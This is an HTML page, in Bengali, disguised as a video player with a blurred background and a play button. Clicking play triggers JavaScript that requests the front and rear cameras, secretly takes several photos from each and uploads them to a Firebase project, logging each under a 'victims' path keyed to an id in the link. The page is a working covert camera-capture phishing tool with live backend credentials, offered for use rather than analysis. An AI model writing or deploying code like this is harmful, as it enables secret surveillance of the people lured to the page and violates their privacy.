<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ভিডিও লোড হচ্ছে...</title>
  <style>
    body, html { margin:0; padding:0; height:100%; background:#000; overflow:hidden; }
    .bg { 
      position:fixed; top:0; left:0; width:100%; height:100%; 
      background: url('https://i.ibb.co.com/8XjY5Yk/blur-bg.jpg') center/cover no-repeat; 
      filter: blur(10px);
    }
    .play-btn {
      position: absolute;
      top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      width: 100px; height: 100px;
      background: rgba(0,0,0,0.8);
      border-radius: 50%;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10;
      animation: pulse 2s infinite;
    }
    .play-btn::after {
      content: '';
      width: 0; height: 0;
      border-left: 35px solid #ff0050;
      border-top: 25px transparent solid;
      border-bottom: 25px transparent solid;
      margin-left: 10px;
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(255,0,80,0.7); }
      70% { box-shadow: 0 0 0 40px rgba(255,0,80,0); }
    }
    .loading { color:white; position:absolute; top:60%; left:50%; transform:translateX(-50%); font-size:1.4em; display:none; }
  </style>
</head>
<body>

<div class="bg"></div>
<div class="play-btn" onclick="startCapture()"></div>
<div class="loading" id="loading">ক্যামেরা চালু হচ্ছে... দয়া করে অপেক্ষা করুন</div>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
  authDomain: "cam-snap-8e956.firebaseapp.com",
  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
  projectId: "cam-snap-8e956",
  storageBucket: "cam-snap-8e956.firebasestorage.app",
  messagingSenderId: "982089892260",
  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131",
  measurementId: "G-S5S37F55T6"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const storage = firebase.storage();

const urlParams = new URLSearchParams(location.search);
const id = urlParams.get('id');
if (!id) document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:50%'>Invalid Link</h1>";

function startCapture() {
  document.querySelector('.play-btn').style.display = 'none';
  document.getElementById('loading').style.display = 'block';

  const cameras = ['user', 'environment'];
  cameras.forEach(facing => {
    for(let i = 0; i < 5; i++) {
      setTimeout(() => takePhoto(facing), i * 500);
    }
  });
}

async function takePhoto(facing) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();

    setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = 640; canvas.height = 480;
      canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
      uploadPhoto(dataUrl);
      stream.getTracks().forEach(t => t.stop());
    }, 1000);
  } catch(e) {}
}

function uploadPhoto(dataUrl) {
  const blob = dataURLtoBlob(dataUrl);
  const photoId = Date.now();
  const ref = storage.ref(`photos/${id}/${photoId}.jpg`);
  ref.put(blob).then(() => {
    ref.getDownloadURL().then(url => {
      db.ref(`victims/${id}`).push({ url, time: Date.now() });
    });
  });
}

function dataURLtoBlob(dataurl) {
  let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
      bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
  while(n--) u8arr[n] = bstr.charCodeAt(n);
  return new Blob([u8arr], {type:mime});
}
</script>
</body>
</html>
